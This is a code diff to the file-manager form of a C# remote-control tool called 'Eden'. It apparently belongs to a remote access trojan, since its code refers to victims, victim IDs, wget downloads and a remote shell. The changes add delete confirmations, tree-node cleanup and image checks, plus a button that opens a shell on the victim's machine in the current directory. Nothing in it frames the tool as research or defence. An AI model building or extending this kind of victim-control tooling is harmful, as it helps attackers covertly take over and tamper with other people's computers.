@@ -14,14 +14,6 @@ namespace Eden
 {
     public partial class frmFileMgr : Form
     {
-        /*
-         * Todo:
-         * Upload
-         * Download
-         * Archive
-         * Datetime
-         */
-
         public clsClient m_clnt;
         public clsVictim m_victim;
         public string szVictimID;
@@ -201,6 +193,18 @@ namespace Eden
                                         currentNode.Nodes.Add(node);
                                     }
                                 }
+
+                                //Remove nodes which do not exist.
+                                List<TreeNode> lnNode = currentNode.Nodes.Cast<TreeNode>().ToList();
+                                List<string> lsFolder = listView1.Items.Cast<ListViewItem>().Where(x => ((stEntryTag)(x.Tag)).bDirectory).Select(y => y.Text).ToList();
+                                if (lsFolder.Count < lnNode.Count)
+                                {
+                                    for (int i = 0; i < lnNode.Count; i++)
+                                    {
+                                        if (!lsFolder.Contains(lnNode[i].Text))
+                                            currentNode.Nodes.Remove(lnNode[i]);
+                                    }
+                                }
                             }
 
                             treeView1.ExpandAll();
@@ -241,14 +245,6 @@ namespace Eden
 
                         LvRefresh();
                     }
-                    else if (aMsg[1] == "uf")
-                    {
-
-                    }
-                    else if (aMsg[1] == "df")
-                    {
-
-                    }
                     else if (aMsg[1] == "touch")
                     {
 
@@ -273,19 +269,6 @@ namespace Eden
                         ShowWget(ls);
 
                         LvRefresh();
-                    }
-                    else if (aMsg[1] == "new")
-                    {
-                        if (aMsg[2] == "d")
-                        {
-                            string szDirName = EZCrypto.Encoder.b64d2str(aMsg[3]);
-                            int nCode = int.Parse(aMsg[4]);
-
-                            if (nCode == 1)
-                            {
-                                MessageBox.Show("Add directory successfully:\n" + szDirName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                            }
-                        }
                     }
                     else if (aMsg[1] == "goto")
                     {
@@ -466,6 +449,10 @@ namespace Eden
                     {
                         f.UpdateStatus(st.szFilename, st.szMsg);
                     }
+                }
+                else
+                {
+                    MessageBox.Show("Not found");
                 }
             }));
         }
@@ -667,14 +654,38 @@ namespace Eden
                 }
                 else if (e.KeyCode == Keys.Delete)
                 {
-                    SendDeleteFile(GetDeleteFilesFromSelectedItems());
+                    var ls = GetDeleteFilesFromSelectedItems();
+                    DialogResult dr = MessageBox.Show(
+                        $"Are you sure to delete {ls.Count} {(ls.Count == 1 ? "file" : "files")}?",
+                        "Warning",
+                        MessageBoxButtons.YesNo,
+                        MessageBoxIcon.Question,
+                        MessageBoxDefaultButton.Button2
+                    );
+
+                    if (dr != DialogResult.Yes)
+                        return;
+
+                    SendDeleteFile(ls);
                 }
             }
         }
 
         private void toolStripMenuItem6_Click(object sender, EventArgs e)
         {
-            SendDeleteFile(GetDeleteFilesFromSelectedItems());
+            var ls = GetDeleteFilesFromSelectedItems();
+            DialogResult dr = MessageBox.Show(
+                $"Are you sure to delete {ls.Count} {(ls.Count == 1 ? "file" : "files")}?",
+                "Warning",
+                MessageBoxButtons.YesNo,
+                MessageBoxIcon.Question,
+                MessageBoxDefaultButton.Button2
+            );
+
+            if (dr != DialogResult.Yes)
+                return;
+
+            SendDeleteFile(ls);
         }
 
         //Refresh
@@ -814,6 +825,12 @@ namespace Eden
                     lsImgFilename.Add(st.szFullName);
             }
 
+            if (lsImgFilename.Count == 0)
+            {
+                MessageBox.Show("Cannot find any image file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
             frmFileImage f = clsTools.FindForm<frmFileImage>(szVictimID);
             if (f == null)
             {
@@ -835,6 +852,12 @@ namespace Eden
                 var st = (stEntryTag)item.Tag;
                 if (!st.bDirectory && clsTools.IsImageFilename(st.szFullName))
                     lsImgFilename.Add(st.szFullName);
+            }
+
+            if (lsImgFilename.Count == 0)
+            {
+                MessageBox.Show("Cannot find any image file.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
             }
 
             frmFileImage f = clsTools.FindForm<frmFileImage>(szVictimID);
@@ -881,6 +904,26 @@ namespace Eden
             f.ShowDialog();
 
             LvRefresh();
+        }
+
+        private void toolStripButton4_Click(object sender, EventArgs e)
+        {
+            frmShell? f = clsTools.FindForm<frmShell>(m_victim);
+            if (f == null)
+            {
+                string szCurrentDir = fnGetCurrentDir();
+                szCurrentDir = string.IsNullOrEmpty(szCurrentDir) ? "." : szCurrentDir;
+
+                if (f == null)
+                {
+                    f = new frmShell(m_victim, szCurrentDir);
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
         }
     }
 }
